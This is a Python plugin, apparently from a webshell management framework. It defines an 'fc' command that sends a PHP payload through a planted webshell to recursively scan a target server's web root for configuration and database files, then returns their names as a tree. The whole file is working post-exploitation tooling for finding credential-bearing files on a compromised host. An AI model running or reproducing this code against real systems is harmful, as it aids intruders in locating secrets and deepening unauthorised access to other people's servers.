from libs.config import alias, gget
from libs.myapp import send, color, print_tree
from json import JSONDecodeError


def get_php(file_path: str):
    return """$cfgs=array("cfg","config","db","database");
function is_cfg($v,$vv){
    return strstr($v, $vv);
}
function scan_rescursive($directory) {
    global $cfgs;
    $res = array();
    foreach(glob("$directory/*") as $item) {
        if(is_dir($item)) {
            $items=explode('/', $item);
            $folder = base64_encode(end($items));
            $res[$folder] = scan_rescursive($item);
            continue;
        }
        else if (count(array_filter(array_map("is_cfg", array_fill(0, count($cfgs), $item), $cfgs)))){
            $res[] = base64_encode(basename($item));
        }
    }
    return $res;
}
print(json_encode(scan_rescursive("%s")));""" % file_path


@alias(True, fp="file_path")
def run(web_file_path: str = ""):
    """
    fc

    Find config file from target system.

    eg: fc {web_file_path=webroot}
    """
    web_file_path = web_file_path if (len(web_file_path)) else gget("webshell.root", "webshell")
    php = get_php(web_file_path)
    try:
        file_tree = send(f'{php}').r_json
    except JSONDecodeError:
        print(color.red("Null Error"))
        return
    print_tree(web_file_path, file_tree)
